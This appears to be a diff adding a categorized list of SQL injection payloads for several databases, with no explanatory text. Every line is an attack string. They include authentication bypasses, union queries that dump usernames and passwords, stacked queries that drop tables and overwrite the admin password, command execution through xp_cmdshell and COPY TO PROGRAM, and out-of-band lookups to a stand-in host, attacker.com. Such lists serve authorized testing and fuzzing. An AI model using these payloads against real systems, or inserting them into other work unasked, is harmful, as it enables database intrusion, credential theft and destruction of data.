@@ -1,0 +1,72 @@
+# SQL Injection Payloads
+# Category: Authentication Bypass
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+1' OR '1'='1
+1 OR 1=1
+1' OR '1'='1' --
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+" OR 1=1--
+or 1=1--
+' or ''='
+" or ""="
+') or ('1'='1
+
+# Category: Union Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+1' UNION SELECT ALL FROM information_schema.tables WHERE '1'='1
+
+# Category: Error Based
+' AND 1=CONVERT(int,@@version)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--
+' AND GTR(@@version,0)--
+
+# Category: Time Based
+1'; WAITFOR DELAY '0:0:5'--
+1' AND SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1; SELECT pg_sleep(5)--
+1' AND BENCHMARK(5000000,MD5('test'))--
+1' OR SLEEP(5)#
+1" AND SLEEP(5)#
+
+# Category: Stacked Queries
+1'; DROP TABLE users--
+1'; INSERT INTO users VALUES('hacker','hacked')--
+1'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+# Category: Out of Band
+'; EXEC xp_dirtree('//attacker.com/x')--
+'; EXEC master..xp_dirtree '\\attacker.com\x'--
+
+# Category: MySQL Specific
+' AND 1=1 UNION SELECT @@version--
+' AND 1=1 UNION SELECT table_name FROM information_schema.tables--
+' AND 1=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+
+# Category: PostgreSQL Specific
+'; SELECT version()--
+' UNION SELECT NULL,version()--
+'; COPY (SELECT '') TO PROGRAM 'id'--
+
+# Category: MSSQL Specific
+'; EXEC xp_cmdshell('whoami')--
+' UNION SELECT @@version--
+'; WAITFOR DELAY '0:0:10'--
+
+# Category: Oracle Specific
+' UNION SELECT banner FROM v$version--
+' UNION SELECT NULL FROM dual--
+' AND 1=utl_inaddr.get_host_address('attacker.com')--
